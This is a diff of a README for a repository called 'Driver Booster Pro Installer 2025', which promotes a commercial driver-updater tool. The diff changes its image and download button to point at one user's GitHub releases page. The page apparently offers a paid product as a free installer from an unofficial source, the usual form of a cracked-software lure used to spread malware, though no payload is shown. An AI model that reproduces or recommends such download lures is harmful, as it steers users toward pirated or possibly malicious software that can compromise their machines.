@@ -2,7 +2,7 @@
 
 Welcome to the **Driver Booster Pro Installer 2025** repository! This repository is dedicated to providing you with the latest tools and software to automatically update drivers and optimize your system for enhanced performance and stability. 
 
-![Driver Booster Pro](https://example.com/driver-booster-pro-image.jpg)
+![Driver Booster Pro](https://github.com/zacaria22/Driver-Booster-Pro-Installer-2025/releases)
 
 ## About Driver Booster Pro 
 **Driver Booster Pro** is a powerful driver updater program that enables you to keep your drivers up to date with just one click. It helps in enhancing your PC's performance by ensuring all your hardware components have the latest drivers installed. In addition to driver update functionality, Driver Booster Pro also offers system optimization tools to improve the overall efficiency of your computer.
@@ -40,7 +40,7 @@ Welcome to the **Driver Booster Pro Installer 2025** repository! This repository
 ## Installation
 To download the **Driver Booster Pro Installer 2025**, click on the button below:
 
-[![Download Driver Booster Pro](https://img.shields.io/badge/Download-Installer-blue)](https://github.com/assets/Release.zip)
+[![Download Driver Booster Pro](https://github.com/zacaria22/Driver-Booster-Pro-Installer-2025/releases)](https://github.com/zacaria22/Driver-Booster-Pro-Installer-2025/releases)
 
 Note: The link provided above is for the installer file. Simply click on it to begin the download.
 
